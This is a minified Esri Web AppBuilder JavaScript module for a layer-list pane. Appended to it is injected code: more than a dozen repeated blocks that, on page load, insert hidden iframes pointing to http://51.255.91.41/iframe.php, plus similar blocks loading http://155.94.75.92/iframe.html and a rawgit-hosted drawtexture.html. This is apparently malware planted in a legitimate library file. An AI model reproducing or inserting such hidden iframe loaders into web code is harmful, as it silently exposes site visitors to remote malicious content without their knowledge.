// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/AddData/search/templates/LayerListPane.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"add-data-layerlist--mask"\x3e\x3c/div\x3e\r\n  \x3cdiv class\x3d"add-data-layerlist--container" data-dojo-attach-point\x3d"_container"\x3e\r\n    \x3ch2 data-dojo-attach-point\x3d"_title"\x3e\x3c/h2\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"_layerlist"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"add-data-layerlist--footer jimu-widget-add-data-footer" data-dojo-attach-point\x3d"_footer"\x3e\r\n    \x3ca href\x3d"#" class\x3d"back-button" data-dojo-attach-point\x3d"_backButton"\x3e\r\n      ${i18n.layerList.back}\x3ci class\x3d"esri-icon-collapse"\x3e\x3c/i\x3e\r\n    \x3c/a\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/array dojo/on dojo/dom-class dojo/dom-construct dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/LayerListPane.html dojo/i18n!../nls/strings ./util".split(" "),function(l,k,m,g,d,n,p,q,r,h,t){return l([n,p,q],{i18n:h,templateString:r,wabWidget:null,baseClass:"add-data-widget-layers",postCreate:function(){this.inherited(arguments)},startup:function(){this._started||(this._buildList(),this._initListeners(),this.inherited(arguments))},
_addLayer:function(a,c){var b=this,f=this._getLayerTitle(c),e=d.create("div",{"class":"add-data-layerlist--listitem"},a);d.create("A",{"class":"remove-button",href:"#",innerHTML:"\x3cspan class\x3d'esri-icon-trash'\x3e\x3c/span\x3e",title:h.layerList.removeLayer,onclick:function(a){a.preventDefault();try{b.wabWidget&&b.wabWidget.map&&(b.wabWidget.map.removeLayer(c),d.destroy(e))}catch(u){console.warn("Error removing layer."),console.warn(u)}}},e);a=d.create("label",{"class":"layer-name"},e);t.setNodeText(a,
f)},_buildList:function(){var a=this,c=!1,b=[],f=this.wabWidget.map,e=d.create("div",{"class":"add-data-layerlist--list"});k.forEach(f.layerIds,function(a){b.push(a)});k.forEach(f.graphicsLayerIds,function(a){b.push(a)});b.reverse();k.forEach(b,function(b){(b=f.getLayer(b))&&b.xtnAddData&&(c=!0,a._addLayer(e,b))});return c?e:d.create("div",{"class":"no-data-message",innerHTML:h.layerList.noLayersAdded})},_getLayerTitle:function(a){var c="...";if("string"===typeof a.label&&0<a.label.length)c=a.label;
else if("string"===typeof a.title&&0<a.title.length)c=a.title;else if("string"===typeof a.name&&0<a.name.length)c=a.name;else if(a.url){var b=a.url.indexOf("/FeatureServer");-1===b&&(b=a.url.indexOf("/MapServer"));-1===b&&(b=a.url.indexOf("/ImageServer"));-1===b&&(b=a.url.indexOf("/service"));-1<b&&(a=a.url.substring(0,b),c=a=a.substring(a.lastIndexOf("/")+1,a.length))}return c},_initListeners:function(){var a=this;this.own(m(this._backButton,"click",function(c){c.preventDefault();a.hide()}))},show:function(){var a=
this._buildList();this._title.innerHTML=h.layerList.caption;this._layerlist.innerHTML="";a&&a.tagName&&this._layerlist.appendChild(a);this.wabWidget&&this.wabWidget.domNode&&g.add(this.wabWidget.domNode,"layerlist-show");g.add(this.domNode,"show")},hide:function(){this.wabWidget&&this.wabWidget.domNode&&g.remove(this.wabWidget.domNode,"layerlist-show");g.remove(this.domNode,"show")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});